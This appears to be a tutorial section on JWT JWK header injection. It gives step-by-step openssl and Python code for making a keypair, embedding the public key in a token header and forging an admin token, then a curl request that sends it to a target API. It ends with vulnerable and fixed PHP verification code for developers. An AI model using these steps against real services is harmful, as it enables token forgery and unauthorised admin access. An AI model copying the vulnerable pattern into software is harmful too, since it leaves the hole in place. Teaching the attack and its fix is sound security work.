# 2.1 JWK Injection

## Goal

Embed attacker-controlled RSA public key directly in JWT header to forge arbitrary tokens.

---

## How JWK Injection Works

JWK = JSON Web Key. Server can accept embedded key:

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "use": "sig",
    "n": "0vx7agoebGc9jcsQVI30eW07ijqp...",
    "e": "AQAB"
  }
}
```

**Vulnerability:** If server uses embedded key instead of stored keys, attacker can use own key!

---

## Exploitation Steps

### Step 1: Generate RSA Keypair

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

### Step 2: Extract Public Key as JWK

Python script:
```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import json
import base64

# Load public key
with open('public.pem', 'rb') as f:
    pub_key = serialization.load_pem_public_key(f.read(), default_backend())

# Get numbers
numbers = pub_key.public_numbers()
n = numbers.n
e = numbers.e

# Convert to base64url (JWT format)
def to_base64url(num):
    # Convert number to bytes
    byte_length = (num.bit_length() + 7) // 8
    bytes_val = num.to_bytes(byte_length, 'big')
    # Base64url encode
    return base64.urlsafe_b64encode(bytes_val).rstrip(b'=').decode('ascii')

jwk = {
    "kty": "RSA",
    "use": "sig",
    "alg": "RS256",
    "n": to_base64url(n),
    "e": to_base64url(e)
}

print(json.dumps(jwk))
```

### Step 3: Create Token with Embedded JWK

```python
import jwt

payload = {"role":"admin", "sub":"123"}

# Add JWK to header
headers = {
    "alg": "RS256",
    "jwk": jwk_dict  # From step 2
}

# Sign with YOUR private key
token = jwt.encode(payload, private_key, algorithm='RS256', headers=headers)
print(token)
```

### Step 4: Submit Token

```bash
curl -H "Authorization: Bearer TOKEN" \
     https://api.target.com/admin
```

### Step 5: Server Processes

1. Server receives token with embedded JWK
2. Server extracts key from header
3. Server validates signature with embedded key
4. Signature matches (you signed it!) = ACCEPTED

---

## Why It Works

```
Normal server flow:
1. Look up key by kid
2. Verify signature with stored key
3. Accept or reject

Vulnerable server flow:
1. Extract key from JWK header
2. Verify signature with extracted key
3. Always accepts (attacker provided key!)
```

---

## Real-World Scenario

**Target:** Enterprise API using RS256

**Attack:**
1. Generate own RSA keypair
2. Embed public key in JWT header
3. Sign token with own private key
4. Submit to server
5. Server extracts your key from header
6. Signature validates = ACCEPTED
7. Full token forgery capability!

## Prevention for Developers

❌ **BAD:**
```php
// Trust embedded key
$key = $jwt_header['jwk'];
JWT::verify($token, $key);
```

✅ **GOOD:**
```php
// Use only stored keys
$kid = $jwt_header['kid'];
if (!isset($stored_keys[$kid])) {
    die('Key not found');
}
$key = $stored_keys[$kid];
JWT::verify($token, $key);
```
